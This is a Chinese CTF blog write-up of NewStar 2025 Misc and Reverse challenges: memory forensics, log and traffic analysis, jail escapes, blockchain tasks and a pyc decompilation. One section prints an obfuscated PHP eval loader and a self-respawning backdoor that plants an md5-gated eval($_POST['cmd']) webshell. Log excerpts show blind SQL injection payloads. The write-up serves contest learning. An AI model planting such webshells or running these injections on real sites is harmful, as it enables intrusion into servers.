---
title: Newstar2025
published: 2025-11-30
description: "第一个打的新生赛，选了re和misc方向，好玩爱玩，感觉博客好好看就把我的抽象题解放过来吧"
tags: ["新生赛", "CTF"]
category: 新生赛
draft: false

---



因为比较懒所以只放week3到week5的了

# Misc方向

## [Misc]jail

额首先开始给我的文件没有flag是全局变量qwq（恼

然后ai真蠢，不用ai上网查了下就有个告诉我help看main函数的，解决了

ai一直沉浸在它的绕过里无法自拔（





## S7

这个上网一查就有告诉我怎么看的了

虽然一开始顺序不太对hh

后面有点怀疑然后用Item排了一下就对了

Item [1]: (DB 1.DBX 22.0 BYTE 2)->用这个22.0



## 内存取证windows

主要难点都在配环境了

环境弄好根据网上教的一个个复制粘贴就行（后面不会有更抽象的吧

```
python2 vol.py -f 1.raw --profile=Win7SP1x64 netscan
125.216.248.74:11451
python2 vol.py -f 1.raw --profile=Win7SP1x64 dlllist -p 2864
Temp

┌──(root㉿kali)-[~/volatility]
└─# python2 vol.py -f 1.raw --profile=Win7SP1x64 mimikatz

Volatility Foundation Volatility Framework 2.6.1
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  JustAGuestAwA    Arisamik         admin123                                
wdigest  ARISAMIK$        WORKGROUP      

2800 explorer.exe         0x000000000260c660 COMPUTERNAME                   ARISAMIK

```





## [Misc]区块链-以太坊的约定

第一个注册知道是12

第二个算一下1145

第三个因为是题目所以查的是假钱（坑）（大坑）（非常坑）（再次批评ai）

第四个不用运行也知道吧





## [Misc]日志分析-盲辨海豚

注入日志分析

```
171.16.20.55 - - [31/Aug/2025:18:46:43 +0800] "GET /sqli_bool.php/?id=1%20and%20ascii(substr((select%20flag%20from%20sqli.flag),37,1))='119' HTTP/1.1" 200 22
171.16.20.55 - - [31/Aug/2025:18:46:43 +0800] "GET /sqli_bool.php/?id=1%20and%20ascii(substr((select%20flag%20from%20sqli.flag),37,1))='120' HTTP/1.1" 200 22
171.16.20.55 - - [31/Aug/2025:18:46:43 +0800] "GET /sqli_bool.php/?id=1%20and%20ascii(substr((select%20flag%20from%20sqli.flag),37,1))='121' HTTP/1.1" 200 6
171.16.20.55 - - [31/Aug/2025:18:46:43 +0800] "GET /sqli_bool.php/?id=1%20and%20ascii(substr((select%20flag%20from%20sqli.flag),38,1))='123' HTTP/1.1" 200 22
171.16.20.55 - - [31/Aug/2025:18:46:43 +0800] "GET /sqli_bool.php/?id=1%20and%20ascii(substr((select%20flag%20from%20sqli.flag),38,1))='125' HTTP/1.1" 200 6
```

很容易注意到6是对的

脚本提取出flag就好了



## 流量分析-听声辩位

通过简单处理后直接手搓（虽然处理的好像没那么对但是直接找规律了。。
处理脚本自己多弄点提示词就好了

```
请求位置	测试条件	结果
--------	--------	------
第1个字符	ASCII > 64	too big
第1个字符	ASCII > 96	too big
第1个字符	ASCII > 112	right
第1个字符	ASCII > 104	right
第1个字符	ASCII > 100	too big
第1个字符	ASCII > 102	right                    f
第1个字符	ASCII > 101	too big          
第2个字符	ASCII > 96	too big
第2个字符	ASCII > 112	right
第2个字符	ASCII > 104	too big
第2个字符	ASCII > 108	right                     l
第2个字符	ASCII > 106	too big
第2个字符	ASCII > 107	too big
第3个字符	ASCII > 96	too big
第3个字符	ASCII > 112	right
第3个字符	ASCII > 104	right
第3个字符	ASCII > 100	right
第3个字符	ASCII > 98	right
第3个字符	ASCII > 97	right                   a
第4个字符	ASCII > 96	too big
第4个字符	ASCII > 112	right
第4个字符	ASCII > 104	right
第4个字符	ASCII > 100	too big
第4个字符	ASCII > 102	too big
第4个字符	ASCII > 103	right           g
第5个字符	ASCII > 96	too big
第5个字符	ASCII > 112	too big
第5个字符	ASCII > 120	too big
第5个字符	ASCII > 124	right
第5个字符	ASCII > 122	too big         
第5个字符	ASCII > 123	right            {
第6个字符	ASCII > 64	too big
第6个字符	ASCII > 96	too big
第6个字符	ASCII > 112	right
第6个字符	ASCII > 104	right
第6个字符	ASCII > 100	right
第6个字符	ASCII > 98	right          b
第6个字符	ASCII > 97	too big
第7个字符	ASCII > 96	too big
第7个字符	ASCII > 112	right
第7个字符	ASCII > 104	too big
第7个字符	ASCII > 108	right           l
第7个字符	ASCII > 106	too big
第7个字符	ASCII > 107	too big
第8个字符	ASCII > 96	too big
第8个字符	ASCII > 112	right
第8个字符	ASCII > 104	too big
第8个字符	ASCII > 108	right
第8个字符	ASCII > 106	right
第8个字符	ASCII > 105	right         i
第9个字符	ASCII > 96	too big
第9个字符	ASCII > 112	right
第9个字符	ASCII > 104	too big
第9个字符	ASCII > 108	too big
第9个字符	ASCII > 110	right           n
第9个字符	ASCII > 109	too big
第10个字符	ASCII > 96	too big
第10个字符	ASCII > 112	right
第10个字符	ASCII > 104	right
第10个字符	ASCII > 100	right        d
第10个字符	ASCII > 98	too big
第10个字符	ASCII > 99	too big
第11个字符	ASCII > 96	right
第11个字符	ASCII > 48	too big
第11个字符	ASCII > 72	too big
第11个字符	ASCII > 84	too big
第11个字符	ASCII > 90	too big
第11个字符	ASCII > 93	too big
第11个字符	ASCII > 94	too big
第11个字符	ASCII > 95	right            _
第12个字符	ASCII > 64	too big
第12个字符	ASCII > 96	too big
第12个字符	ASCII > 112	right
第12个字符	ASCII > 104	too big
第12个字符	ASCII > 108	right
第12个字符	ASCII > 106	right
第12个字符	ASCII > 105	right       i
第13个字符	ASCII > 96	too big
第13个字符	ASCII > 112	right
第13个字符	ASCII > 104	too big
第13个字符	ASCII > 108	too big
第13个字符	ASCII > 110	right        n
第13个字符	ASCII > 109	too big
第14个字符	ASCII > 96	too big
第14个字符	ASCII > 112	right
第14个字符	ASCII > 104	too big
第14个字符	ASCII > 108	right
第14个字符	ASCII > 106	right          j
第14个字符	ASCII > 105	too big
第15个字符	ASCII > 96	too big
第15个字符	ASCII > 112	right
第15个字符	ASCII > 104	right
第15个字符	ASCII > 100	too big
第15个字符	ASCII > 102	right
第15个字符	ASCII > 101	right         e
第16个字符	ASCII > 96	too big
第16个字符	ASCII > 112	right
第16个字符	ASCII > 104	right
第16个字符	ASCII > 100	right
第16个字符	ASCII > 98	too big
第16个字符	ASCII > 99	right         c
第17个字符	ASCII > 96	too big
第17个字符	ASCII > 112	too big
第17个字符	ASCII > 120	right
第17个字符	ASCII > 116	right        t
第17个字符	ASCII > 114	too big
第17个字符	ASCII > 115	too big
第18个字符	ASCII > 96	too big
第18个字符	ASCII > 112	right
第18个字符	ASCII > 104	too big
第18个字符	ASCII > 108	right
第18个字符	ASCII > 106	right
第18个字符	ASCII > 105	right          i
第19个字符	ASCII > 96	too big
第19个字符	ASCII > 112	right
第19个字符	ASCII > 104	too big
第19个字符	ASCII > 108	too big
第19个字符	ASCII > 110	too big
第19个字符	ASCII > 111	right          o
第20个字符	ASCII > 96	too big
第20个字符	ASCII > 112	right
第20个字符	ASCII > 104	too big
第20个字符	ASCII > 108	too big
第20个字符	ASCII > 110	right          n
第20个字符	ASCII > 109	too big
第21个字符	ASCII > 96	right
第21个字符	ASCII > 48	too big
第21个字符	ASCII > 72	too big
第21个字符	ASCII > 84	too big
第21个字符	ASCII > 90	too big
第21个字符	ASCII > 93	too big
第21个字符	ASCII > 94	too big
第21个字符	ASCII > 95	right          _
第22个字符	ASCII > 64	too big
第22个字符	ASCII > 96	right
第22个字符	ASCII > 80	too big
第22个字符	ASCII > 88	right
第22个字符	ASCII > 84	right
第22个字符	ASCII > 82	right        R
第22个字符	ASCII > 81	too big
第23个字符	ASCII > 64	too big
第23个字符	ASCII > 96	too big
第23个字符	ASCII > 112	right
第23个字符	ASCII > 104	right
第23个字符	ASCII > 100	too big
第23个字符	ASCII > 102	right
第23个字符	ASCII > 101	right              e
第24个字符	ASCII > 96	right
第24个字符	ASCII > 48	too big
第24个字符	ASCII > 72	right
第24个字符	ASCII > 60	too big
第24个字符	ASCII > 66	right
第24个字符	ASCII > 63	too big
第24个字符	ASCII > 64	right         @
第25个字符	ASCII > 64	too big
第25个字符	ASCII > 96	too big
第25个字符	ASCII > 112	right
第25个字符	ASCII > 104	too big
第25个字符	ASCII > 108	right         l
第25个字符	ASCII > 106	too big
第25个字符	ASCII > 107	too big
第26个字符	ASCII > 96	too big
第26个字符	ASCII > 112	right
第26个字符	ASCII > 104	too big
第26个字符	ASCII > 108	right           l
第26个字符	ASCII > 106	too big
第26个字符	ASCII > 107	too big
第27个字符	ASCII > 96	too big
第27个字符	ASCII > 112	too big
第27个字符	ASCII > 120	too big
第27个字符	ASCII > 124	right
第27个字符	ASCII > 122	right
第27个字符	ASCII > 121	right           y
第28个字符	ASCII > 96	right
第28个字符	ASCII > 48	too big
第28个字符	ASCII > 72	too big
第28个字符	ASCII > 84	too big
第28个字符	ASCII > 90	too big
第28个字符	ASCII > 93	too big
第28个字符	ASCII > 94	too big
第28个字符	ASCII > 95	right          _
第29个字符	ASCII > 64	too big
第29个字符	ASCII > 96	right
第29个字符	ASCII > 80	right
第29个字符	ASCII > 72	right
第29个字符	ASCII > 68	right
第29个字符	ASCII > 66	right       B
第29个字符	ASCII > 65	too big
第30个字符	ASCII > 64	too big
第30个字符	ASCII > 96	too big
第30个字符	ASCII > 112	right
第30个字符	ASCII > 104	too big
第30个字符	ASCII > 108	right
第30个字符	ASCII > 106	right
第30个字符	ASCII > 105	right        i
第31个字符	ASCII > 96	too big
第31个字符	ASCII > 112	right
第31个字符	ASCII > 104	right
第31个字符	ASCII > 100	too big
第31个字符	ASCII > 102	too big
第31个字符	ASCII > 103	right            g
第32个字符	ASCII > 96	too big
第32个字符	ASCII > 112	right
第32个字符	ASCII > 104	right
第32个字符	ASCII > 100	too big
第32个字符	ASCII > 102	too big
第32个字符	ASCII > 103	right         g
第33个字符	ASCII > 96	too big
第33个字符	ASCII > 112	right
第33个字符	ASCII > 104	right
第33个字符	ASCII > 100	too big
第33个字符	ASCII > 102	too big
第33个字符	ASCII > 103	right            g
第34个字符	ASCII > 96	right
第34个字符	ASCII > 48	right
第34个字符	ASCII > 1	too big
第34个字符	ASCII > 24	too big
第34个字符	ASCII > 36	right
第34个字符	ASCII > 30	too big
第34个字符	ASCII > 33	right          !
第34个字符	ASCII > 31	too big
第34个字符	ASCII > 32	too big
第35个字符	ASCII > 64	too big
第35个字符	ASCII > 96	too big
第35个字符	ASCII > 112	too big
第35个字符	ASCII > 120	too big
第35个字符	ASCII > 124	too big
第35个字符	ASCII > 126	right
第35个字符	ASCII > 125	right          }
第36个字符	ASCII > 64	right
第36个字符	ASCII > 32	right
第36个字符	ASCII > 1	right


flag{blind_injection_Re@lly_Biggg!}

```



## 混乱的网站

我拿御剑扫的（

```
$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%66%64%679%5F%65%68%63%73%77%6F4%26%6637%6A");
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};
$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
$OO0000=$O00OO0{7}.$O00OO0{13};
$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};

eval($O00O0O("JE8wTzAwMD0iT3Bab2FncnlYTkpDSFF6Zm5BV2RrcUVNam12UmV1VGJsd2lCVklLRHhzUGN0RllTR1VMaGFHcm9mcVhlY2lPbHdQTEFkellGam5JU0RUVWttSEJnVktXeU5oc2JSSnZFWkNweFF1TXR2YjlLZnd6cWJQR0dyMjVVRVROQUZjaVZFVjl0cFQ5ZUZsdDBFZE5Wc0JKaWxkaVZGQzkwZlkxVmMyUkdnWVYwc2J6R2FLMHNPUXJHZ1F1cXZ4emRNVzlXcFlpWHJROVVFVzVLZnd6ZGFLMHNPUXR0cDJKcXZ4emR4eHlvcFlpWGh3VlVGeElkYUswc01lb25obGtEZzJrVmhiMHFoREsvRVF0S2hRVlRzUTFqaXh0RU9DOXdrTmtnTzJySnBZRWVPMTBHdkIwZGFiRkRTRGo0cEJ1MnJCeURwWUlMaUJ1NGlMT3RwRFAzclFoUlNZdUtpVFNkc2NaenJjcnRnbHRFT0M5UEIxaXVZZUZEZ1lQZGN4ajdBQjgraERKcXNXb1ViUEczZlFWSnJ4em9TeFY3YlBvT2ZZcHFzbENUZllSVmMyTjRmY2kwRWVxanJUVkpyeGpHaHdKaWxxak9yVFZKck45S0Zja0FwMjlIRlFOSEZ3U29PUXJHZ1F1Sk9RdHRwMkpIT1FpVXJRdUdhSzBzbGMwaWxxVjFFMlJWcmN6b2lCektTbGo3YlBvT2gzTkhnUVZIZmV0QWMwck9CSU5BY2VqN2JQRzliUG8vdnE9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=")); ?>



$O00O0O=base64_decode


$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};
eval(base64_decode("JE8wTzAwMD0iT3Bab2FncnlYTkpDSFF6Zm5BV2RrcUVNam12UmV1VGJsd2lCVklLRHhzUGN0RllTR1VMaGFHcm9mcVhlY2lPbHdQTEFkellGam5JU0RUVWttSEJnVktXeU5oc2JSSnZFWkNweFF1TXR2YjlLZnd6cWJQR0dyMjVVRVROQUZjaVZFVjl0cFQ5ZUZsdDBFZE5Wc0JKaWxkaVZGQzkwZlkxVmMyUkdnWVYwc2J6R2FLMHNPUXJHZ1F1cXZ4emRNVzlXcFlpWHJROVVFVzVLZnd6ZGFLMHNPUXR0cDJKcXZ4emR4eHlvcFlpWGh3VlVGeElkYUswc01lb25obGtEZzJrVmhiMHFoREsvRVF0S2hRVlRzUTFqaXh0RU9DOXdrTmtnTzJySnBZRWVPMTBHdkIwZGFiRkRTRGo0cEJ1MnJCeURwWUlMaUJ1NGlMT3RwRFAzclFoUlNZdUtpVFNkc2NaenJjcnRnbHRFT0M5UEIxaXVZZUZEZ1lQZGN4ajdBQjgraERKcXNXb1ViUEczZlFWSnJ4em9TeFY3YlBvT2ZZcHFzbENUZllSVmMyTjRmY2kwRWVxanJUVkpyeGpHaHdKaWxxak9yVFZKck45S0Zja0FwMjlIRlFOSEZ3U29PUXJHZ1F1Sk9RdHRwMkpIT1FpVXJRdUdhSzBzbGMwaWxxVjFFMlJWcmN6b2lCektTbGo3YlBvT2gzTkhnUVZIZmV0QWMwck9CSU5BY2VqN2JQRzliUG8vdnE9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=")); ?>


eval('?>'.base64_decode($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));


<?php
ignore_user_abort(true);
set_time_limit(0);
$file = './backdoor.php';
$hack = 'I hack you!';
/** $code = &quot;&lt;?php if(md5(\$_GET['flag2'])=='87c298a56e0caa355872ab47db11e06c'){@eval(\$_POST['cmd']);}?&gt;&quot;; **/
while (1){
    if (!file_exists($file)) {
       file_put_contents($file,$hack.$code);
    }
    usleep(5000);
    #unlink(__FILE__);
}
?>
```

md5解密傻瓜都会吧（

flag1是js_very_good，应该都能搞到

我用这串代码（网上学的）搞出来的

```
<?php
	$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%66%64%679%5F%65%68%63%73%77%6F4%26%6637%6A");
echo '第一步生成：',$O00OO0;
//n1zb/ma5\vt0i28-pxuqy*6lrfdg9_ehcswo4&f37j
$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};
$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
$OO0000=$O00OO0{7}.$O00OO0{13};
$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};
echo '第二步生成：',$O00O0O;

echo '第三步生成：';
echo($O00O0O("JE8wTzAwMD0iT3Bab2FncnlYTkpDSFF6Zm5BV2RrcUVNam12UmV1VGJsd2lCVklLRHhzUGN0RllTR1VMaGFHcm9mcVhlY2lPbHdQTEFkellGam5JU0RUVWttSEJnVktXeU5oc2JSSnZFWkNweFF1TXR2YjlLZnd6cWJQR0dyMjVVRVROQUZjaVZFVjl0cFQ5ZUZsdDBFZE5Wc0JKaWxkaVZGQzkwZlkxVmMyUkdnWVYwc2J6R2FLMHNPUXJHZ1F1cXZ4emRNVzlXcFlpWHJROVVFVzVLZnd6ZGFLMHNPUXR0cDJKcXZ4emR4eHlvcFlpWGh3VlVGeElkYUswc01lb25obGtEZzJrVmhiMHFoREsvRVF0S2hRVlRzUTFqaXh0RU9DOXdrTmtnTzJySnBZRWVPMTBHdkIwZGFiRkRTRGo0cEJ1MnJCeURwWUlMaUJ1NGlMT3RwRFAzclFoUlNZdUtpVFNkc2NaenJjcnRnbHRFT0M5UEIxaXVZZUZEZ1lQZGN4ajdBQjgraERKcXNXb1ViUEczZlFWSnJ4em9TeFY3YlBvT2ZZcHFzbENUZllSVmMyTjRmY2kwRWVxanJUVkpyeGpHaHdKaWxxak9yVFZKck45S0Zja0FwMjlIRlFOSEZ3U29PUXJHZ1F1Sk9RdHRwMkpIT1FpVXJRdUdhSzBzbGMwaWxxVjFFMlJWcmN6b2lCektTbGo3YlBvT2gzTkhnUVZIZmV0QWMwck9CSU5BY2VqN2JQRzliUG8vdnE9PSI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=")); 

$O0O000="OpZoagryXNJCHQzfnAWdkqEMjmvReuTblwiBVIKDxsPctFYSGULhaGrofqXeciOlwPLAdzYFjnISDTUkmHBgVKWyNhsbRJvEZCpxQuMtvb9KfwzqbPGGr25UETNAFciVEV9tpT9eFlt0EdNVsBJildiVFC90fY1Vc2RGgYV0sbzGaK0sOQrGgQuqvxzdMW9WpYiXrQ9UEW5KfwzdaK0sOQttp2JqvxzdxxyopYiXhwVUFxIdaK0sMeonhlkDg2kVhb0qhDK/EQtKhQVTsQ1jixtEOC9wkNkgO2rJpYEeO10GvB0dabFDSDj4pBu2rByDpYILiBu4iLOtpDP3rQhRSYuKiTSdscZzrcrtgltEOC9PB1iuYeFDgYPdcxj7AB8+hDJqsWoUbPG3fQVJrxzoSxV7bPoOfYpqslCTfYRVc2N4fci0EeqjrTVJrxjGhwJilqjOrTVJrN9KFckAp29HFQNHFwSoOQrGgQuJOQttp2JHOQiUrQuGaK0slc0ilqV1E2RVrczoiBzKSlj7bPoOh3NHgQVHfetAc0rOBINAcej7bPG9bPo/vq==";
echo 11111111111111111111111111;
echo htmlspecialchars('?>'.$O00O0O($O0OO00($OO0O00($O0O000,$OO0000*2),$OO0O00($O0O000,$OO0000,$OO0000),$OO0O00($O0O000,0,$OO0000))));
?>
```

## 应急响应-初识

难点是下载百度网盘，解法是有一个好老大

```
题目内容：
欢迎来到第四周。在前三周的挑战中，你已经掌握了基础的日志分析、流量分析、osint能力，请挑战者们集中所有力量，打开这扇应急响应大门吧！

城邦的图片托管服务平台遭受到恶意攻击，请挑战中们协助临时工清理处置，完成报告。

用户名：Administrator 密码：Newst@r

flag{木马连接密码_创建账号工具发布时间(年-月-日)_影子用户密码}

【难度：中等】
```

到处乱翻就行

上传目录查看隐藏文件能发现木马文件，默认密码MD5加密刚好是

创建账号工具乱翻能看到一个很明显的，名字忘了，bing搜一下名字就有

密码用mimikatz弄到hash值后用hashcat爆破（开始拿md5爆，我是傻子qwq



## jail-Neuro jail

正常解法是注释下一行，但我是猪逼搜了之后不往下面翻导致没看到

然后就和define斗智斗勇

```
#define cout string a;s = "NewStar!!!"; std::cout
```



## 区块链-智能合约

打开网站，编译运行，弄点钱，点即送





还好做的少不用写那么多题解，爽

## TIME HACKER

无聊玩的时候

注意到第一位密码输入2会卡一下，然后搜到侧信道攻击

然后ai脚本解出密码（后面要考

注意到主题是时间，那应该还会考时间戳

先注意到压缩包里的文件时间被改了，但是肯定要结合后面的内容（不然破解密码干嘛

先注意到用010打开图片会有一个像时间的内容，

然后注意到密码有点像时间戳起始，

然后注意到010那里看到的像时间的内容其实是排序（不重复，还刚好是那么多）

然后注意到  文件修改时间戳-密码  是有意义内容

然后就解决了



## [musc ch4l1eng3][Misc]不是所有牛奶都叫_____

看流量包

注意到log

加载log

注意到出现了post

猜测不是第一个就是最后一个

注意到最后一个，丢给cyberchef

给出二维码

扫码即可获得flag

```
已解码数据 1:
-------------------------------------------------------------------------
位置:(20.6,14.6)-(375.1,14.6)-(20.6,369.1)-(375.4,369.4)
颜色正常, 正像
版本: 3   
纠错等级:L, 掩码:2   
内容:
flag{W0w_You_r3al1y_knOW_TL5&QrCode}
```

题外话：目前14:07，平台还不给我交flag，怒





# Reverse方向



## [Re] pyz3

工具弄出来的

```
#!/usr/bin/env python
# visit https://tool.lu/pyc/ for more information
# Version: Python 3.12


def check(flag):
    47 * flag[0] + 41 * flag[1] + 32 * flag[2] + 56 * flag[3] + 52 * flag[4] + 67 * flag[5] + 13 * flag[6] + 25 * flag[7] + 20 * flag[8] + 98 * flag[9] + 88 * flag[10] + 65 * flag[11] + 82 * flag[12] + 92 * flag[13] + 3 * flag[14] + 29 * flag[15] + 93 * flag[16] + 88 * flag[17] + 45 * flag[18] + 58 * flag[19] + 40 * flag[20] + 72 * flag[21] + 99 * flag[22] + 10 * flag[23] + 94 * flag[24] + 62 * flag[25] + 82 * flag[26] + 92 * flag[27] + 23 * flag[28] + 46 * flag[29] + 55 * flag[30] + 72 * flag[31] + 44 * flag[32] + 9 * flag[33] + 65 * flag[34] + 42 * flag[35] == 176386
    10 * flag[0] + 98 * flag[1] + 5 * flag[2] + 28 * flag[3] + 68 * flag[4] + 20 * flag[5] + 2 * flag[6] + 22 * flag[7] + 65 * flag[8] + 44 * flag[9] + 85 * flag[10] + 97 * flag[11] + 33 * flag[12] + 74 * flag[13] + 93 * flag[14] + 74 * flag[15] + 41 * flag[16] + 65 * flag[17] + 32 * flag[18] + 93 * flag[19] + 22 * flag[20] + 69 * flag[21] + 68 * flag[22] + 57 * flag[23] + 47 * flag[24] + 29 * flag[25] + 74 * flag[26] + 54 * flag[27] + 91 * flag[28] + 90 * flag[29] + 26 * flag[30] + 11 * flag[31] + 89 * flag[32] + 57 * flag[33] + 100 * flag[34] + 95 * flag[35] == 186050
    25 * flag[0] + 22 * flag[1] + 54 * flag[2] + 5 * flag[3] + 8 * flag[4] + 3 * flag[5] + 12 * flag[6] + 70 * flag[7] + 25 * flag[8] + 61 * flag[9] + 68 * flag[10] + 12 * flag[11] + 27 * flag[12] + 42 * flag[13] + 83 * flag[14] + 91 * flag[15] + 67 * flag[16] + 46 * flag[17] + 8 * flag[18] + 45 * flag[19] + 94 * flag[20] + 80 * flag[21] + 69 * flag[22] + 95 * flag[23] + 12 * flag[24] + 21 * flag[25] + 94 * flag[26] + 82 * flag[27] + 93 * flag[28] + 41 * flag[29] + 4 * flag[30] + 56 * flag[31] + 92 * flag[32] + 77 * flag[33] + 15 * flag[34] + 30 * flag[35] == 154690
    33 * flag[0] + 49 * flag[1] + 56 * flag[2] + 40 * flag[3] + 90 * flag[4] + 59 * flag[5] + 82 * flag[6] + 6 * flag[7] + 81 * flag[8] + 32 * flag[9] + 23 * flag[10] + 76 * flag[11] + 93 * flag[12] + 83 * flag[13] + 10 * flag[14] + 44 * flag[15] + 58 * flag[16] + 33 * flag[17] + 79 * flag[18] + 77 * flag[19] + 82 * flag[20] + 56 * flag[21] + 70 * flag[22] + 34 * flag[23] + 45 * flag[24] + 76 * flag[25] + 57 * flag[26] + 43 * flag[27] + 100 * flag[28] + 19 * flag[29] + 11 * flag[30] + 90 * flag[31] + 3 * flag[32] + 60 * flag[33] + 57 * flag[34] + 23 * flag[35] == 172116
    65 * flag[0] + 70 * flag[1] + 20 * flag[2] + 32 * flag[3] + 75 * flag[4] + 30 * flag[5] + 3 * flag[6] + 78 * flag[7] + 35 * flag[8] + 45 * flag[9] + 95 * flag[10] + 93 * flag[11] + 52 * flag[12] + 32 * flag[13] + 88 * flag[14] + 94 * flag[15] + 67 * flag[16] + 34 * flag[17] + 91 * flag[18] + 88 * flag[19] + 31 * flag[20] + 61 * flag[21] + 17 * flag[22] + 99 * flag[23] + 100 * flag[24] + 49 * flag[25] + 4 * flag[26] + 60 * flag[27] + 81 * flag[28] + 88 * flag[29] + 43 * flag[30] + 34 * flag[31] + 30 * flag[32] + 52 * flag[33] + 18 * flag[34] + 100 * flag[35] == 190544
    81 * flag[0] + 42 * flag[1] + 28 * flag[2] + 98 * flag[3] + 31 * flag[4] + 46 * flag[5] + 64 * flag[6] + 15 * flag[7] + 49 * flag[8] + 13 * flag[9] + 100 * flag[10] + 81 * flag[11] + 32 * flag[12] + 52 * flag[13] + 59 * flag[14] + 24 * flag[15] + 94 * flag[16] + 32 * flag[17] + 93 * flag[18] + 32 * flag[19] + 13 * flag[20] + 89 * flag[21] + 37 * flag[22] + 30 * flag[23] + 78 * flag[24] + 81 * flag[25] + 9 * flag[26] + 45 * flag[27] + 93 * flag[28] + 100 * flag[29] + 97 * flag[30] + 10 * flag[31] + 80 * flag[32] + 54 * flag[33] + 88 * flag[34] + 85 * flag[35] == 190323
    76 * flag[0] + 54 * flag[1] + 5 * flag[2] + 14 * flag[3] + 62 * flag[4] + 44 * flag[5] + 24 * flag[6] + 29 * flag[7] + 85 * flag[8] + 87 * flag[9] + 19 * flag[10] + 3 * flag[11] + 65 * flag[12] + 24 * flag[13] + 92 * flag[14] + 37 * flag[15] + 57 * flag[16] + 20 * flag[17] + 45 * flag[18] + 5 * flag[19] + 13 * flag[20] + 91 * flag[21] + 92 * flag[22] + 75 * flag[23] + 36 * flag[24] + 79 * flag[25] + 12 * flag[26] + 22 * flag[27] + 75 * flag[28] + 82 * flag[29] + 28 * flag[30] + 82 * flag[31] + 24 * flag[32] + 53 * flag[33] + 56 * flag[34] + 92 * flag[35] == 162017
    53 * flag[0] + 52 * flag[1] + 72 * flag[2] + 23 * flag[3] + 26 * flag[4] + 13 * flag[5] + 62 * flag[6] + 96 * flag[7] + 67 * flag[8] + 96 * flag[9] + 66 * flag[10] + 41 * flag[11] + 5 * flag[12] + 18 * flag[13] + 37 * flag[14] + 13 * flag[15] + 61 * flag[16] + 71 * flag[17] + 91 * flag[18] + 96 * flag[19] + 56 * flag[20] + 3 * flag[21] + 65 * flag[22] + 14 * flag[23] + 57 * flag[24] + 69 * flag[25] + 75 * flag[26] + 68 * flag[27] + 10 * flag[28] + 60 * flag[29] + 62 * flag[30] + 95 * flag[31] + 53 * flag[32] + 19 * flag[33] + 7 * flag[34] + 56 * flag[35] == 165118
    26 * flag[0] + 7 * flag[1] + 49 * flag[2] + 14 * flag[3] + 36 * flag[4] + 87 * flag[5] + 21 * flag[6] + 35 * flag[7] + 15 * flag[8] + 91 * flag[9] + 15 * flag[10] + 100 * flag[11] + 8 * flag[12] + 32 * flag[13] + 100 * flag[14] + 35 * flag[15] + 66 * flag[16] + 3 * flag[17] + 79 * flag[18] + 96 * flag[19] + 82 * flag[20] + 95 * flag[21] + 68 * flag[22] + 13 * flag[23] + 86 * flag[24] + 51 * flag[25] + 24 * flag[26] + 76 * flag[27] + 30 * flag[28] + 60 * flag[29] + 29 * flag[30] + 70 * flag[31] + 40 * flag[32] + 90 * flag[33] + 44 * flag[34] + 3 * flag[35] == 153332
